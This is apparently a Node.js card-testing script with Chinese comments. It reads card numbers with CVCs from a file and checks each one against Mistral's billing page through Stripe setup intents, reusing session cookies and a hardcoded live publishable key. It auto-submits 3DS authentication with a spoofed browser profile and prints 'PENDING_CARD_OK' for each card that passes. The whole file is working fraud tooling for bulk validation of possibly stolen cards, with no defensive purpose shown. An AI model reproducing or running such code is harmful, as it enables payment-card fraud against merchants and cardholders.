// 待复活卡清单轮询：对疑似冷却型/3DS 卡逐张快速测试
// 卡清单从本地文件读取（不入库）：默认 retest_cards.txt，每行一张，格式 卡号|MM|YYYY|CVC，# 注释
// 成功（succeeded 或 3DS 摩擦less 通过）→ 打印 PENDING_CARD_OK: 卡信息
import { readFileSync, existsSync } from 'fs';

const CARDS_FILE = process.argv.includes('--cards')
  ? process.argv[process.argv.indexOf('--cards') + 1]
  : 'retest_cards.txt';
const CARDS = existsSync(CARDS_FILE)
  ? readFileSync(CARDS_FILE, 'utf8').split(/\r?\n/).map((s) => s.trim()).filter((s) => s && !s.startsWith('#'))
  : [];
if (!CARDS.length) {
  console.error(`[重测] 卡清单为空：把卡写入 ${CARDS_FILE}（格式 卡号|MM|YYYY|CVC）`);
  process.exit(1);
}

const CFG = process.argv.includes('--config') ? process.argv[process.argv.indexOf('--config') + 1] : 'test_fresh_config.json';
const cfg = JSON.parse(readFileSync(CFG, 'utf8'));
const cookie = Object.entries(cfg.session?.cookies || {}).map(([k, v]) => `${k}=${v}`).join('; ');
const ADMIN = 'https://admin.mistral.ai';
const H = { origin: ADMIN, referer: `${ADMIN}/subscription/upgrade/redeem`, 'x-trpc-source': 'nextjs-react', cookie, 'content-type': 'application/json' };
const KEY = 'pk_live_51O7wyUBYKjiYB8m0Yqxsl4CBynQH6dPe2YRbLJ7852H4lbLFQB6te2KXIFpy3hVZCFUnSVes7cmlUw3kKNkVpHWc00kcFfFqa7';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const b64 = (o) => Buffer.from(JSON.stringify(o), 'utf8').toString('base64');

async function makeIntent() {
  const ir = await fetch(`${ADMIN}/api/local-trpc/billing.createPaymentMethodSetupIntent`, {
    method: 'POST', headers: H, body: JSON.stringify({ json: null, meta: { values: ['undefined'], v: 1 } }),
    signal: AbortSignal.timeout(60000),
  });
  return (await ir.json())?.result?.data?.json?.intent_secret || null;
}

async function auth3ds(act) {
  const browser = {
    fingerprintAttempted: false, fingerprintData: null, challengeWindowSize: '05',
    threeDSCompInd: 'Y', browserJavaEnabled: false, browserJavascriptEnabled: true,
    browserLanguage: 'en-US', browserColorDepth: '24', browserScreenHeight: '1080',
    browserScreenWidth: '1920', browserTZ: String(new Date().getTimezoneOffset()),
    browserUserAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  };
  const form = new URLSearchParams();
  form.set('source', act.three_d_secure_2_source);
  form.set('browser', JSON.stringify(browser));
  const ds = { hosted: 'false', same_origin_frame: 'true', spc_eligible: 'false', webauthn_eligible: 'true', publickey_credentials_get_allowed: 'true' };
  for (const [k, v] of Object.entries(ds)) form.set(`one_click_authn_device_support[${k}]`, v);
  form.set('frontend_execution', b64({ fingerprintOutcome: 'not_supported' }));
  const r = await fetch('https://api.stripe.com/v1/3ds2/authenticate', {
    method: 'POST',
    headers: { authorization: `Bearer ${KEY}`, origin: 'https://js.stripe.com', 'content-type': 'application/x-www-form-urlencoded', 'stripe-version': '2020-08-27' },
    body: form.toString(), signal: AbortSignal.timeout(60000),
  });
  return r.json().catch(() => null);
}

let anyOk = false;
for (const line of CARDS) {
  const parts = line.split('|');
  const c = { number: parts[0], exp_month: parts[1], exp_year: parts[2], cvc: parts[3] };
  let out = `${c.number} ${c.exp_month}/${c.exp_year} -> `;
  try {
    const secret = await makeIntent();
    if (!secret) { console.log('创建 intent 失败，中止'); break; }
    const siId = secret.split('_secret_')[0];
    const p = new URLSearchParams({
      return_url: `${ADMIN}/subscription/upgrade/redeem`,
      'payment_method_data[type]': 'card',
      'payment_method_data[card][number]': c.number,
      'payment_method_data[card][cvc]': c.cvc,
      'payment_method_data[card][exp_year]': c.exp_year,
      'payment_method_data[card][exp_month]': c.exp_month,
      'payment_method_data[allow_redisplay]': 'unspecified',
      'payment_method_data[billing_details][address][postal_code]': cfg.address.zipcode,
      'payment_method_data[billing_details][address][country]': cfg.address.country,
      'payment_method_data[pasted_fields]': 'zip',
      expected_payment_method_type: 'card', use_stripe_sdk: 'true', key: KEY, client_secret: secret,
    });
    const r = await fetch(`https://api.stripe.com/v1/setup_intents/${siId}/confirm`, {
      method: 'POST',
      headers: { accept: 'application/json', origin: ADMIN, referer: `${ADMIN}/subscription/upgrade/redeem`, 'content-type': 'application/x-www-form-urlencoded' },
      body: p.toString(), signal: AbortSignal.timeout(60000),
    });
    const j = await r.json().catch(() => null);
    if (j?.error) { out += `${j.error.code}${j.error.decline_code ? '/' + j.error.decline_code : ''}`; console.log(out); await sleep(300); continue; }
    const si = j?.setup_intent || j;
    if (si.status === 'succeeded') { out += `✅ 成功 pm=${si.payment_method}`; console.log(out); console.log(`PENDING_CARD_OK: ${line}`); anyOk = true; continue; }
    if (si.status === 'requires_action' && si.next_action?.use_stripe_sdk?.type === 'stripe_3ds2_fingerprint') {
      const aj = await auth3ds(si.next_action.use_stripe_sdk);
      const ts = aj?.ares?.transStatus;
      out += `3DS state=${aj?.state} ts=${ts}`;
      if (ts !== 'R' && ts !== 'N' && !(aj?.creq && ts === 'C')) {
        await sleep(1500);
        const gr = await fetch(`https://api.stripe.com/v1/setup_intents/${siId}?client_secret=${encodeURIComponent(secret)}&is_stripe_sdk=false&key=${KEY}`, { headers: { origin: ADMIN, referer: `${ADMIN}/` }, signal: AbortSignal.timeout(60000) });
        const gj = await gr.json().catch(() => null);
        out += ` 最终=${gj?.status}`;
        if (gj?.status === 'succeeded') { out += ' ✅'; console.log(out); console.log(`PENDING_CARD_OK: ${line}`); anyOk = true; await sleep(300); continue; }
      }
      console.log(out);
    } else { out += `状态=${si.status} type=${si.next_action?.type || 'none'}`; console.log(out); }
  } catch (e) { console.log(out + '异常:' + e.message); }
  await sleep(300);
}
console.log(anyOk ? 'RESULT: 有卡恢复，可跑全流程' : 'RESULT: 全部仍失败');
